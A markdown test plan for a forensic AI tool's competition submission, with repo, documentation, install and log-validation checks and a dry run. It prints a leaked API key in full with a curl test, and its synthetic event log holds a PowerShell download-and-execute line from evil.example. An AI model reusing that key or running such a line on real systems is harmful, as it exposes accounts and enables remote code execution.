# Geoff Competition Submission — Test Plan

**Last updated:** 2026-06-01  
**Based on:** COMPETITION_READINESS.md assessment (HEAD `afb74cb`)  
**Purpose:** Living document Dan uses to track and verify each of the 8 required deliverables before submission.

---

## Table of Contents

1. [Per-Deliverable Tests](#per-deliverable-tests)
2. [Master Checklist](#master-checklist)
3. [Dry-Run Procedure](#dry-run-procedure)

---

## Per-Deliverable Tests

---

### D1 — Code Repository

**Current status:** YELLOW (API key in history, internal files in HEAD, uncommitted changes)

#### Test 1.1 — API key not live in git history

**What we're testing:** The `OLLAMA_API_KEY` value `7be76563b7a04e93989180aa36aa6504.UscdScTsKD5tNfd1EAd_0_uN` committed in `0b5322c` is either rotated (key is dead) or scrubbed from history.

**How to test:**
```bash
# Step 1: Verify key is still present in history
git log -p --all | grep "7be76563b7a04e93989180aa36aa6504"

# Step 2: Attempt to use the key against Ollama API provider
# (Contact Ollama/OpenWebUI — check their console or use curl to verify key is invalidated)
curl -H "Authorization: Bearer 7be76563b7a04e93989180aa36aa6504.UscdScTsKD5tNfd1EAd_0_uN" \
     https://api.ollama.ai/v1/models 2>&1 | grep -E "401|403|unauthorized|invalid"

# Step 3: Confirm local .env does NOT contain old key
grep "7be76563b7a04e93989180aa36aa6504" .env && echo "FAIL: old key still in .env" || echo "PASS: .env clean"
```

**Pass criteria:**
- `git log -p` grep returns zero matches, OR
- The curl confirms the key returns HTTP 401/403 (key is dead), AND
- `.env` contains a new key value (or is empty/placeholder)

**Automation possible:** Yes — wrap in `scripts/check_secrets.sh`:
```bash
#!/bin/bash
LEAKED_KEY="7be76563b7a04e93989180aa36aa6504"
git log -p --all | grep -q "$LEAKED_KEY" && echo "FAIL: key in git history" && exit 1
grep -q "$LEAKED_KEY" .env 2>/dev/null && echo "FAIL: key in .env" && exit 1
echo "PASS: no leaked key found"
```

---

#### Test 1.2 — Internal dev files removed from HEAD

**What we're testing:** Files that reveal internal failures and design pivots (`CLAUDE_REVIEW.md`, `COMBINED_AUDIT_REPORT.md`, `DESIGN_FIXES.md`, `EVIDENCE_AUDIT.md`, etc.) are not present when a judge runs `git clone`.

**How to test:**
```bash
# Simulate a fresh clone
TMPDIR=$(mktemp -d)
git clone . "$TMPDIR/geoff-judge-clone" --depth 1
ls "$TMPDIR/geoff-judge-clone"/ | grep -E "CLAUDE_REVIEW|COMBINED_AUDIT|DESIGN_FIXES|EVIDENCE_AUDIT|FIX_PLAN|GEOFF_SYSTEMIC|IMPLEMENTATION_PLAN|QA_RESULTS|SELF_HEAL_INVESTIGATION|TEST_RESULTS|VALIDATION_REPORT|par_loop"
# Output must be empty (no matches)
rm -rf "$TMPDIR"
```

**Pass criteria:** Zero matching files appear in a fresh shallow clone.

**Automation possible:** Yes — add to CI or `scripts/check_repo_clean.sh`.

---

#### Test 1.3 — Working tree matches HEAD

**What we're testing:** Core source files (`geoff_pipeline.py`, `geoff_routes.py`, `geoff_templates.py`, `geoff_utils.py`, `pipeline_phases.py`, `sift_specialists_extended.py`, `super_timeline.py`, `static/index.html`, `static/main.js`, `static/tokens.css`) are committed to HEAD so what a judge clones is what runs.

**How to test:**
```bash
git status --short | grep -E "^.M (src/|static/)" | head -20
# Must return nothing (no modified tracked files)

git diff --stat HEAD -- src/ static/
# Must show 0 files changed
```

**Pass criteria:** `git diff HEAD -- src/ static/` shows no diff.

**Automation possible:** Yes.

---

#### Test 1.4 — `.env.example` exists and is complete

**What we're testing:** A judge can determine required environment variables from a template file without reading README prose.

**How to test:**
```bash
# File must exist
test -f .env.example && echo "PASS: file exists" || echo "FAIL: missing"

# Must contain all 7 known required variables
for var in OLLAMA_API_KEY OLLAMA_BASE_URL GEOFF_API_KEY GEOFF_EVIDENCE_PATH \
           GEOFF_WORK_DIR GEOFF_MODEL_PROFILE GEOFF_LOG_LEVEL; do
  grep -q "$var" .env.example && echo "PASS: $var" || echo "FAIL: missing $var"
done
```

**Pass criteria:** File exists; all 7 required vars present with placeholder values (not real credentials).

**Automation possible:** Yes — straightforward grep check.

---

#### Test 1.5 — License and public repo

**What we're testing:** Repo is public on GitHub, MIT or Apache 2.0 license is present and correct.

**How to test:**
```bash
# Local check
test -f LICENSE && head -3 LICENSE
# Must say "Apache License" or "MIT License"

# Remote check — run from a browser or separate terminal
curl -s https://api.github.com/repos/legacyboy/Geoff | python3 -c \
  "import sys,json; d=json.load(sys.stdin); print('PRIVATE' if d['private'] else 'PUBLIC', d['license']['spdx_id'])"
# Must print: PUBLIC Apache-2.0
```

**Pass criteria:** Repo is public; `LICENSE` file present; SPDX ID is `Apache-2.0`.

**Automation possible:** Yes.

---

### D2 — Demo Video

**Current status:** RED (does not exist)

#### Test 2.1 — Video file exists and is accessible

**What we're testing:** A ≤5-minute screencast file (MP4 or YouTube link) exists and is linked from the README or Devpost.

**How to test:**
```bash
# Check if a video link is in the README
grep -iE "(youtu\.be|youtube\.com|vimeo|loom\.com|demo.*\.mp4|screencast)" README.md

# Check for a local video file
find . -name "*.mp4" -o -name "*.webm" -o -name "*.mov" | grep -iv node_modules
```

**Pass criteria:** At least one of: (a) YouTube/Loom URL present in README that loads a public video, OR (b) local MP4/WebM committed to repo or release assets.

**Automation possible:** Existence check yes; content check is manual.

---

#### Test 2.2 — Demo shows live execution (not scripted playback)

**What we're testing:** Video shows `geoff-find-evil` running against real or synthetic evidence with observable output — not a slideshow or pre-recorded terminal replay.

**Manual checklist (reviewer watches video):**
- [ ] Terminal visible with actual command invocation: `geoff-find-evil <path> --agent-trace --show-agents`
- [ ] `[Manager]`, `[Forensicator]`, `[Critic]`, `[Healer]` colored agent prefixes appear in output
- [ ] Evidence directory shown (`ls /mnt/...` or equivalent) before run starts
- [ ] JSON output (findings.jsonl or agent_trace.jsonl) visible at some point
- [ ] Duration: at least 3 minutes of active execution, total ≤ 6 minutes

**Pass criteria:** All 5 checklist items confirmed by a human reviewer.

**Automation possible:** No — requires human judgment.

---

#### Test 2.3 — Demo shows self-correction event

**What we're testing:** The video includes at least one observable self-correction — Healer firing, Critic rejecting, or Manager replaying.

**Manual checklist:**
- [ ] A tool failure or Critic rejection is visible in the terminal output
- [ ] `[Healer]` or `SELF_HEAL` event visible OR narration explicitly calls out self-correction
- [ ] The failed step retries and succeeds (or is flagged by Manager)

**Pass criteria:** At least one self-correction event is visible or narrated in the video.

**Automation possible:** No.

---

#### Test 2.4 — `--agent-trace` flag produces output file

**What we're testing:** The flag documented in `COMPETITION_COMPLIANCE.md §Demonstration` actually works and produces `agent_trace.jsonl`.

**How to test (pre-recording smoke test):**
```bash
# Run against the minimal synthetic evidence set (see Dry-Run section)
./bin/geoff-find-evil tests/fixtures/synthetic_evidence/ \
    --agent-trace --show-agents 2>&1 | tee /tmp/demo_smoke.log

# Verify trace file was created
CASE_DIR=$(ls -td /tmp/geoff-cases/*/  2>/dev/null | head -1)
test -f "$CASE_DIR/agent_trace.jsonl" && \
  echo "PASS: agent_trace.jsonl created ($(wc -l < "$CASE_DIR/agent_trace.jsonl") lines)" || \
  echo "FAIL: no agent_trace.jsonl"
```

**Pass criteria:** `agent_trace.jsonl` exists in case work dir with ≥1 JSON record after the run.

**Automation possible:** Yes — scripted pre-recording smoke test.

---

### D3 — Architecture Diagram

**Current status:** YELLOW (text/ASCII only; no visual artifact)

#### Test 3.1 — Visual diagram file exists

**What we're testing:** A PNG, PDF, SVG, or rendered Mermaid diagram exists as a standalone file (not just embedded ASCII art in a markdown block).

**How to test:**
```bash
# Check for image files
find docs/ -name "*.png" -o -name "*.svg" -o -name "*.pdf" | grep -i "arch\|diagram\|agent\|flow"

# Check for Mermaid diagram in AGENT_PROTOCOL.md that GitHub will render
grep -l '```mermaid' docs/*.md
```

**Pass criteria:** At least one of: (a) image file found matching arch/diagram pattern, OR (b) `docs/AGENT_PROTOCOL.md` or `docs/architecture.md` contains a fenced `mermaid` block (renders on GitHub automatically).

**Automation possible:** Yes — file existence check.

---

#### Test 3.2 — Diagram covers required components

**What we're testing:** The diagram shows the four agents (Manager, Forensicator, Critic, Healer), the artifact flow between them, and the security boundary (MCP at 127.0.0.1, evidence path validation).

**Manual checklist (reviewer inspects diagram):**
- [ ] Manager → Forensicator → Critic flow visible
- [ ] Healer branch visible (on failure)
- [ ] `findings.jsonl`, `audit_trail.jsonl`, `custody/` artifacts labeled
- [ ] MCP server boundary indicated
- [ ] Security note: 127.0.0.1-only bind and/or evidence path validation called out

**Pass criteria:** All 5 checklist items confirmed.

**Automation possible:** No.

---

#### Test 3.3 — Guardrails section distinguishes prompt vs. architectural enforcement

**What we're testing:** A document (README or `docs/ACCURACY_REPORT.md`) explicitly lists which constraints are code-enforced vs. prompt-enforced.

**How to test:**
```bash
grep -rn "prompt.enforced\|architectural\|code.enforced\|guardrail" docs/ README.md
```

**Pass criteria:** At least 3 matches, with at least one labeling evidence path validation as "architectural/code-enforced" and narrative citation as "prompt-enforced."

**Automation possible:** Keyword grep only; content verification is manual.

---

### D4 — Devpost Project Description

**Current status:** RED (does not exist)

#### Test 4.1 — All six required sections are present

**What we're testing:** The Devpost submission (or local draft) contains all six standard Devpost sections.

**How to test:**
```bash
# Check for local draft file
test -f docs/DEVPOST_DESCRIPTION.md && echo "file exists" || echo "FAIL: no draft"

# Check section headers
for section in "What it does" "How we built it" "Challenges" "Accomplishments" \
               "What we learned" "What.s next"; do
  grep -iq "$section" docs/DEVPOST_DESCRIPTION.md && echo "PASS: $section" || echo "FAIL: missing $section"
done
```

**Pass criteria:** File exists; all 6 section headers present.

**Automation possible:** Yes — grep for section headers.

---

#### Test 4.2 — Word count and content quality

**What we're testing:** The description is substantive (800–1200 words) and uses source material from the repo (not generic text).

**How to test:**
```bash
wc -w docs/DEVPOST_DESCRIPTION.md
# Target: 800-1200 words

# Check for repo-specific content (not generic)
grep -ci "batch critic\|git-backed\|geoff triad\|manager.*forensicator\|hallucination" \
  docs/DEVPOST_DESCRIPTION.md
# Target: ≥5 matches
```

**Pass criteria:** 800–1200 words; ≥5 matches on domain-specific terms.

**Automation possible:** Yes.

---

#### Test 4.3 — Design decisions addressed

**What we're testing:** The four key design decisions are explained (Ollama vs. Anthropic, batch Critic, git vs. database, no per-step human gate).

**How to test (manual):**
- [ ] Mentions why Ollama was chosen (local execution, no API key required on SIFT)
- [ ] Explains batch Critic design choice (cross-step correlation, ~3x LLM reduction)
- [ ] Explains git-backed state (reproducibility, tamper detection, forensic idiom)
- [ ] Addresses autonomous execution (Manager gate at triage is the only human checkpoint)

**Pass criteria:** All 4 items addressed in at least one sentence each.

**Automation possible:** Keyword check only.

---

### D5 — Dataset Documentation

**Current status:** YELLOW (M57 run documented in issues/; chain of custody and reproducibility missing)

#### Test 5.1 — `docs/DATASETS.md` exists and is complete

**What we're testing:** A judge can identify which datasets were tested, where to download them, and what Geoff found.

**How to test:**
```bash
test -f docs/DATASETS.md && echo "exists" || echo "FAIL"

# Check required fields
for field in "M57" "NIST\|Digital Corpora" "SHA-256\|sha256" \
             "download\|http\|url" "findings\|found"; do
  grep -qi "$field" docs/DATASETS.md && echo "PASS: $field" || echo "FAIL: $field"
done
```

**Pass criteria:** File exists; M57-Patents, source URL, SHA-256, and findings summary all present.

**Automation possible:** Yes — field presence check.

---

#### Test 5.2 — `docs/REPRODUCING_RESULTS.md` exists and is runnable

**What we're testing:** A judge on a SIFT workstation can follow the instructions end-to-end without referring to any other document.

**How to test:**
```bash
test -f docs/REPRODUCING_RESULTS.md && echo "exists" || echo "FAIL"

# Required sections
for section in "download\|wget\|curl" "GEOFF_EVIDENCE_PATH" \
               "geoff-find-evil" "expected output\|what to expect"; do
  grep -qi "$section" docs/REPRODUCING_RESULTS.md && echo "PASS: $section" || echo "FAIL: $section"
done
```

**Dry-run test:** Follow the instructions literally on a clean VM or container. Record where you get stuck. Instructions pass if a human can complete the run without asking a question.

**Pass criteria:** File exists; all required sections present; a human following the doc cold can complete a run.

**Automation possible:** Existence/field check yes; end-to-end walkthrough is manual.

---

#### Test 5.3 — M57 narrative report present

**What we're testing:** At least an excerpt of the generated narrative report from the M57 run is committed to `docs/sample_reports/`.

**How to test:**
```bash
ls docs/sample_reports/ 2>/dev/null || echo "FAIL: directory missing"
find docs/sample_reports/ -name "*.md" -o -name "*.txt" | head -5
```

**Pass criteria:** `docs/sample_reports/` exists with at least one report file containing ≥ 500 words.

**Automation possible:** Yes — word count check.

---

### D6 — Accuracy Report

**Current status:** YELLOW (internal audit exists; no judge-facing structured report; spoliation not tested)

#### Test 6.1 — `docs/ACCURACY_REPORT.md` exists and covers required areas

**What we're testing:** The judge-facing accuracy report covers FP incidents, missed artifacts, hallucination catches, integrity approach, and known gaps.

**How to test:**
```bash
test -f docs/ACCURACY_REPORT.md && echo "exists" || echo "FAIL"

for section in "false positive\|FP" "hallucination\|hallucinated" \
               "self.correct\|Critic" "evidence integrity\|SHA-256\|custody" \
               "known limitation\|gap\|not implemented"; do
  grep -qi "$section" docs/ACCURACY_REPORT.md && echo "PASS: $section" || echo "FAIL: $section"
done
```

**Pass criteria:** File exists; all 5 topic areas covered.

**Automation possible:** Yes — keyword grep.

---

#### Test 6.2 — Specific hallucination incidents documented with examples

**What we're testing:** The report cites real Critic catch events (from M57 run and COMBINED_AUDIT), not just asserts "hallucinations are caught."

**Manual checklist:**
- [ ] M57 Phase 1 rejection documented: Critic rejected for "claiming file paths were Offsets"
- [ ] "drop table" misclassified as SQL in host context incident mentioned
- [ ] At least one replay event documented (what was replayed and why)

**Pass criteria:** All 3 incidents named with enough detail to trace back to a specific run.

**Automation possible:** No — requires reading the report for specifics.

---

#### Test 6.3 — Spoliation testing performed and documented

**What we're testing:** Evidence directories were verified unmodified before and after a Geoff investigation run.

**How to test (perform the test, then document):**
```bash
# BEFORE investigation run:
hashdeep -rl /path/to/test/evidence > /tmp/evidence_before.hash

# RUN investigation:
./bin/geoff-find-evil /path/to/test/evidence

# AFTER:
hashdeep -rl /path/to/test/evidence > /tmp/evidence_after.hash
diff /tmp/evidence_before.hash /tmp/evidence_after.hash
# Must show no differences
```

**Pass criteria:** `diff` shows no file modifications; result (pass or fail) and the test evidence path documented in `docs/ACCURACY_REPORT.md` with a date.

**Automation possible:** Yes — this is a scripted pre/post hash comparison. Add to `scripts/spoliation_test.sh`.

---

#### Test 6.4 — Narrative generation self-check gap disclosed

**What we're testing:** The accuracy report explicitly discloses that narrative report generation has no structural grounding check (unlike chat, which has `_self_check_chat_response`).

**How to test:**
```bash
grep -i "narrative.*self.check\|self.check.*narrative\|report.*prompt.enforced\|speculation.*prompt" \
  docs/ACCURACY_REPORT.md
```

**Pass criteria:** At least one sentence explicitly naming this limitation is present.

**Automation possible:** Yes.

---

### D7 — Try-It-Out Instructions

**Current status:** YELLOW (good Quick Start; missing `.env.example`, tool gaps, playbook label issues)

#### Test 7.1 — `.env.example` exists with all required vars

*(Same as Test 1.4 — count this check against both D1 and D7.)*

---

#### Test 7.2 — Install completes without errors on clean Ubuntu 22.04

**What we're testing:** `install.sh` runs cleanly on a fresh Ubuntu 22.04 (SIFT base) system.

**How to test:**
```bash
# In a Docker container or fresh VM:
docker run -it ubuntu:22.04 bash -c "
  apt-get update -q && apt-get install -y -q curl git &&
  git clone https://github.com/legacyboy/Geoff /opt/geoff &&
  cd /opt/geoff &&
  bash install.sh 2>&1 | tee /tmp/install.log &&
  echo EXIT_CODE: \$?
"
grep -E "^EXIT_CODE: 0$" /tmp/install.log && echo "PASS" || echo "FAIL: non-zero exit"
grep -iE "error|failed|not found" /tmp/install.log | grep -v "^#" | head -20
```

**Pass criteria:** `install.sh` exits 0; no `error` or `failed` lines in stdout (warnings acceptable).

**Automation possible:** Yes — Docker-based smoke test. Slow (5–15 min) but fully scripted.

---

#### Test 7.3 — `geoff-find-evil --help` works post-install

**What we're testing:** The CLI entry point is on PATH and produces usage output.

**How to test:**
```bash
which geoff-find-evil || echo "FAIL: not on PATH"
geoff-find-evil --help 2>&1 | grep -i "usage\|evidence\|options" && echo "PASS" || echo "FAIL"
```

**Pass criteria:** `which` finds the binary; `--help` output contains "usage" or "evidence."

**Automation possible:** Yes — part of `test_install.sh`.

---

#### Test 7.4 — Playbook label mismatches disclosed

**What we're testing:** The README or Try-It-Out instructions warn a judge about the three mislabeled playbooks (PB-004, PB-011, PB-013).

**How to test:**
```bash
grep -iE "PB-004|PB-011|PB-013|mislabeled|wrong content|known issue" README.md
```

**Pass criteria:** At least one of the three playbook IDs mentioned in a "Known Issues" or "Limitations" section.

**Automation possible:** Yes.

---

#### Test 7.5 — Installer tool gaps documented

**What we're testing:** The 20+ tools not installed by `install.sh` are either (a) added to the installer, or (b) documented in the Try-It-Out instructions as "installed on demand by self-heal."

**How to test:**
```bash
# Check if key tools were added
grep -E "iLEAPP|ALEAPP|foremost|scalpel|zeek|readpst" install.sh | grep "apt-get\|pip install"

# OR check for documentation of the gap
grep -iE "self.heal.*install|on demand|tool.gap|missing tool" README.md docs/REPRODUCING_RESULTS.md 2>/dev/null
```

**Pass criteria:** Either tools are added to installer, OR a note in Try-It-Out instructions explains that `tool_missing` self-heal will auto-install missing tools (and notes internet access is required).

**Automation possible:** Grep check yes; completeness verification is manual.

---

#### Test 7.6 — `test_install.sh` exists and passes

**What we're testing:** The smoke test script is present in HEAD (it was deleted locally) and runs successfully.

**How to test:**
```bash
test -f test_install.sh && echo "exists" || echo "FAIL: missing from working tree"
# If present:
bash test_install.sh 2>&1 | tail -5
```

**Pass criteria:** Script exists in working tree AND exits 0.

**Automation possible:** Yes.

---

### D8 — Agent Execution Logs

**Current status:** RED (protocol documented; zero sample logs in repo)

#### Test 8.1 — Sample logs directory exists with all required artifacts

**What we're testing:** `docs/sample_logs/` contains at least one example of each required log type.

**How to test:**
```bash
REQUIRED_LOGS=(
  "agent_trace.jsonl"
  "batch_critic_assessment.json"
  "manager_decision.json"
  "audit_trail.jsonl"
)
for f in "${REQUIRED_LOGS[@]}"; do
  find docs/sample_logs/ -name "$f" 2>/dev/null | head -1 | \
    xargs -I{} echo "PASS: {}" || echo "FAIL: missing $f"
done

# Also check for a custody sidecar
find docs/sample_logs/ -path "*/custody/*.json" | head -1 | \
  xargs -I{} echo "PASS: custody sidecar {}" || echo "FAIL: no custody sidecar"

# And findings.jsonl
find docs/sample_logs/ -name "findings.jsonl" | head -1 | \
  xargs -I{} echo "PASS: findings.jsonl {}" || echo "FAIL: no findings.jsonl"
```

**Pass criteria:** All 6 artifact types present in `docs/sample_logs/`.

**Automation possible:** Yes — scripted existence check.

---

#### Test 8.2 — Log files are valid JSON / JSONL

**What we're testing:** The committed sample logs are well-formed and parse correctly.

**How to test:**
```bash
# JSONL files: each line must be valid JSON
for f in docs/sample_logs/*.jsonl; do
  python3 -c "
import sys, json
errors = []
with open('$f') as fh:
    for i, line in enumerate(fh, 1):
        line = line.strip()
        if line:
            try: json.loads(line)
            except Exception as e: errors.append(f'line {i}: {e}')
if errors:
    print('FAIL $f:', errors[:3])
else:
    print('PASS $f')
"
done

# JSON files
for f in docs/sample_logs/*.json; do
  python3 -c "import json,sys; json.load(open('$f')); print('PASS $f')" \
    2>&1 || echo "FAIL: $f invalid JSON"
done
```

**Pass criteria:** Zero parse errors across all sample log files.

**Automation possible:** Yes.

---

#### Test 8.3 — Timestamps and required fields present in logs

**What we're testing:** The sample `agent_trace.jsonl` records contain the fields documented in `docs/AGENT_PROTOCOL.md` (timestamp, agent, event_type, and at minimum one domain field).

**How to test:**
```bash
python3 - <<'EOF'
import json
required = {"timestamp", "agent", "event_type"}
with open("docs/sample_logs/agent_trace.jsonl") as f:
    for i, line in enumerate(f, 1):
        rec = json.loads(line.strip())
        missing = required - set(rec.keys())
        if missing:
            print(f"FAIL line {i}: missing {missing}")
        else:
            print(f"PASS line {i}: {rec['agent']} / {rec['event_type']}")
        if i >= 5:
            break
EOF
```

**Pass criteria:** First 5 records all contain `timestamp`, `agent`, and `event_type`.

**Automation possible:** Yes.

---

#### Test 8.4 — Traceability: custody sidecar links to findings record

**What we're testing:** A custody sidecar in `docs/sample_logs/custody/` references the same `step_key` as a record in `findings.jsonl`, demonstrating the end-to-end trace chain claimed in `COMPETITION_COMPLIANCE.md Rule 3`.

**How to test:**
```bash
python3 - <<'EOF'
import json, os, glob

# Get step_keys from custody files
custody_keys = set()
for f in glob.glob("docs/sample_logs/custody/*.json"):
    d = json.load(open(f))
    custody_keys.add(d.get("step_key", os.path.basename(f).replace(".json","")))

# Get step_keys from findings.jsonl
findings_keys = set()
with open("docs/sample_logs/findings.jsonl") as f:
    for line in f:
        rec = json.loads(line.strip())
        if "step_key" in rec:
            findings_keys.add(rec["step_key"])

overlap = custody_keys & findings_keys
print(f"Custody keys: {len(custody_keys)}, Findings keys: {len(findings_keys)}, Overlap: {len(overlap)}")
if overlap:
    print("PASS: traceability chain intact —", list(overlap)[:2])
else:
    print("FAIL: no step_key matches between custody/ and findings.jsonl")
EOF
```

**Pass criteria:** At least one `step_key` appears in both a custody sidecar and `findings.jsonl`.

**Automation possible:** Yes.

---

#### Test 8.5 — `--agent-trace` flag produces output when run live

*(Covered by Test 2.4 — share results between D2 and D8.)*

---

## Master Checklist

### Legend
- `[P]` = Can run in parallel with other P items at same level
- `[S]` = Must run serially (depends on prior item)
- `[M]` = Manual (human action required)
- `[A]` = Automatable / scriptable

---

### Phase 0 — Prerequisites (Serial, all manual)

| # | Item | Test(s) | Time | Who | Type |
|---|------|---------|------|-----|------|
| 0.1 | Confirm Ollama API key is rotated or dead | T1.1 | 1 hr | Dan | M |
| 0.2 | Working SIFT workstation VM with NAS mount confirmed | — | 30 min | Dan | M |
| 0.3 | GitHub repo confirmed public | T1.5 | 5 min | Dan | A |

**Blocker:** 0.1 must complete before any public repo cleanup (risk of publishing bad state).

---

### Phase 1 — Code Repository Cleanup (Can parallelize P1a/P1b)

| # | Item | Test(s) | Time | Who | Type | Depends on |
|---|------|---------|------|-----|------|-----------|
| 1a | `git rm` internal dev files; commit | T1.2 | 1 hr | Dan/Claude Code | S | 0.1 |
| 1b | Commit 7 modified source files | T1.3 | 30 min | Dan | S | 0.1 |
| 1c | Create `.env.example` | T1.4, T7.1 | 30 min | Claude Code | P | — |
| 1d | Restore/rewrite `test_install.sh` | T7.6 | 2 hr | Claude Code | P | — |

**Note:** 1a and 1b should be done in a single cleanup commit or PR to avoid a messy git graph.

---

### Phase 2 — Missing Documents (All parallel)

| # | Item | Test(s) | Time | Who | Type | Depends on |
|---|------|---------|------|-----|------|-----------|
| 2a | Write `docs/DEVPOST_DESCRIPTION.md` | T4.1–4.3 | 4–6 hr | Dan+Claude Code | M+A | Phase 1 done |
| 2b | Write `docs/DATASETS.md` | T5.1 | 2 hr | Claude Code | A | — |
| 2c | Write `docs/REPRODUCING_RESULTS.md` | T5.2 | 2 hr | Claude Code | A | — |
| 2d | Write `docs/ACCURACY_REPORT.md` | T6.1–6.4 | 4–6 hr | Dan+Claude Code | M+A | — |
| 2e | Export Mermaid architecture diagram | T3.1–3.2 | 2 hr | Claude Code | A | — |
| 2f | Add playbook label warning to README | T7.4 | 15 min | Claude Code | A | — |
| 2g | Document installer tool gaps in README | T7.5 | 30 min | Claude Code | A | — |

---

### Phase 3 — Sample Logs (Serial within, parallel with Phase 2)

| # | Item | Test(s) | Time | Who | Type | Depends on |
|---|------|---------|------|-----|------|-----------|
| 3.1 | Run `geoff-find-evil` on synthetic evidence with `--agent-trace` | T2.4, T8.5 | 2 hr | Dan | M | Phase 1 done; SIFT workstation available |
| 3.2 | Sanitize and commit sample log artifacts to `docs/sample_logs/` | T8.1–8.4 | 2 hr | Dan+Claude Code | M+A | 3.1 done |
| 3.3 | Run spoliation test (hashdeep pre/post) and document | T6.3 | 1 hr | Dan | M | SIFT workstation available |
| 3.4 | Extract M57 narrative report excerpt to `docs/sample_reports/` | T5.3 | 1 hr | Dan | M | NAS accessible |

---

### Phase 4 — Demo Video (Serial, manual)

| # | Item | Test(s) | Time | Who | Type | Depends on |
|---|------|---------|------|-----|------|-----------|
| 4.1 | Pre-recording smoke test (T2.4) | T2.4 | 30 min | Dan | M | Phase 1 + 3.1 done |
| 4.2 | Record 5-minute demo screencast | T2.1–2.3 | 2–4 hr | Dan | M | 4.1 passes |
| 4.3 | Upload to YouTube/Loom; add link to README | T2.1 | 30 min | Dan | M | 4.2 done |

---

### Phase 5 — Final Verification (Serial)

| # | Item | Test(s) | Time | Who | Type | Depends on |
|---|------|---------|------|-----|------|-----------|
| 5.1 | Run all automatable tests end-to-end (`scripts/check_repo_clean.sh`, JSON validators, etc.) | All A tests | 30 min | Claude Code | A | All phases done |
| 5.2 | Manual review of all 8 deliverables against pass criteria | All M tests | 2 hr | Dan | M | 5.1 passes |
| 5.3 | Devpost submission: paste description, embed video, submit | T4.* | 1 hr | Dan | M | 5.2 passes |

---

### Summary Timeline

Assuming SIFT workstation is available today and key rotation is confirmed:

| Day | Phases | Target |
|-----|--------|--------|
| Day 1 (today) | 0, 1 | Repo cleaned; key confirmed; source files committed; .env.example done |
| Day 2 | 2, 3 | All docs written; sample logs committed; spoliation tested |
| Day 3 | 4 | Demo video recorded and uploaded |
| Day 4 | 5 | Final pass; Devpost submitted |

**Critical path:** `0.1 → 1a/1b → 3.1 → 4.1 → 4.2 → 5.3`  
Everything else in Phase 2 is parallel work that can happen while the SIFT session is running.

---

## Dry-Run Procedure

This procedure validates Geoff end-to-end using only synthetic evidence. No real case data required. Run this before recording the demo.

### Synthetic Evidence Setup

```bash
# Create a minimal synthetic evidence directory
mkdir -p /tmp/geoff-dry-run/evidence/disk_images
mkdir -p /tmp/geoff-dry-run/evidence/logs

# Create a minimal raw disk image (1 MB, FAT filesystem)
dd if=/dev/zero bs=1M count=1 of=/tmp/geoff-dry-run/evidence/disk_images/test_disk.raw
mkfs.fat /tmp/geoff-dry-run/evidence/disk_images/test_disk.raw 2>/dev/null || true

# Create a synthetic event log
cat > /tmp/geoff-dry-run/evidence/logs/system.evtx.txt <<'EOF'
2026-05-01 10:23:14 EventID=4624 Account=TESTUSER LogonType=3 Source=192.168.1.100
2026-05-01 10:23:45 EventID=4688 Process=powershell.exe CommandLine="IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload')"
2026-05-01 10:24:01 EventID=4625 Account=Administrator FailureReason=BadPassword
EOF

echo "Synthetic evidence created at /tmp/geoff-dry-run/evidence/"
ls -lR /tmp/geoff-dry-run/evidence/
```

### Pre-Run Checklist

```bash
# 1. Verify install
which geoff-find-evil || { echo "FAIL: geoff-find-evil not on PATH"; exit 1; }

# 2. Verify .env is populated
test -f .env || { echo "FAIL: no .env file"; exit 1; }
grep -q "OLLAMA_BASE_URL" .env || echo "WARN: OLLAMA_BASE_URL not set"
grep -q "GEOFF_API_KEY" .env || echo "WARN: GEOFF_API_KEY not set"

# 3. Verify Ollama is reachable
OLLAMA_URL=$(grep OLLAMA_BASE_URL .env | cut -d= -f2)
curl -s --max-time 5 "$OLLAMA_URL/api/tags" > /dev/null && \
  echo "PASS: Ollama reachable" || echo "FAIL: Ollama not reachable at $OLLAMA_URL"

# 4. Verify model is available
curl -s "$OLLAMA_URL/api/tags" | python3 -c \
  "import sys,json; models=[m['name'] for m in json.load(sys.stdin)['models']]; print('Available:', models[:5])"
```

### Dry-Run Execution

```bash
# Set a dedicated work dir to avoid polluting real cases
export GEOFF_WORK_DIR=/tmp/geoff-dry-run/cases

# Run with all trace flags
geoff-find-evil /tmp/geoff-dry-run/evidence \
  --agent-trace \
  --show-agents \
  2>&1 | tee /tmp/geoff-dry-run/dry_run.log

echo "Exit code: $?"
```

### Expected Output Sequence

1. `[Manager] Reviewing triage output...` — Manager builds execution plan
2. `approved_execution_plan` JSON block printed
3. `[Forensicator] PB-SIFT-000` — Triage playbook runs
4. `[Critic] step verdict` — Critic validates triage output
5. `[Forensicator] PB-SIFT-001` or subsequent playbook — per the plan
6. One or more `[Healer]` lines if any tool is missing (expected on fresh install)
7. `[Critic] batch assessment` — holistic review at end
8. `[Manager] decision: approve/flag/replay`
9. `Narrative report written to: ...`

### Post-Run Verification

```bash
# Find the case work directory
CASE_DIR=$(ls -td $GEOFF_WORK_DIR/*/ 2>/dev/null | head -1)
echo "Case dir: $CASE_DIR"

# Check required artifacts
for artifact in agent_trace.jsonl audit_trail.jsonl findings.jsonl \
                batch_critic_assessment.json manager_decision.json; do
  f="$CASE_DIR/$artifact"
  if [ -f "$f" ]; then
    COUNT=$(wc -l < "$f" 2>/dev/null || echo "?")
    echo "PASS: $artifact ($COUNT lines)"
  else
    echo "FAIL: $artifact missing"
  fi
done

# Check custody sidecars
CUSTODY_COUNT=$(ls "$CASE_DIR/custody/"*.json 2>/dev/null | wc -l)
echo "Custody sidecars: $CUSTODY_COUNT"

# Check narrative report
REPORT=$(find "$CASE_DIR" -name "narrative_report.md" | head -1)
if [ -n "$REPORT" ]; then
  WORDS=$(wc -w < "$REPORT")
  echo "PASS: narrative_report.md ($WORDS words)"
else
  echo "FAIL: no narrative_report.md"
fi

# Check git log in case dir
git -C "$CASE_DIR" log --oneline | head -5
```

### Expected Failures and Handling

| Failure | Expected? | Resolution |
|---------|-----------|-----------|
| `[Healer] tool_missing: foremost` | Yes — self-heal installs it | Watch for retry success; if it stays failed, install manually: `sudo apt-get install -y foremost` |
| `[Healer] tool_missing: iLEAPP` | Yes | Same — self-heal or install manually |
| `[Critic] hallucination_flag` on synthetic evidence | Possible | Expected behavior; Critic correctly flags low-evidence claims against minimal synthetic data |
| `[Manager] decision: flag` instead of `approve` | Expected | Synthetic evidence is minimal — Manager may flag rather than approve. This is correct behavior. |
| Ollama connection refused | No — must fix | Start Ollama: `ollama serve &`; verify model is pulled: `ollama pull qwen2.5-coder:14b` |
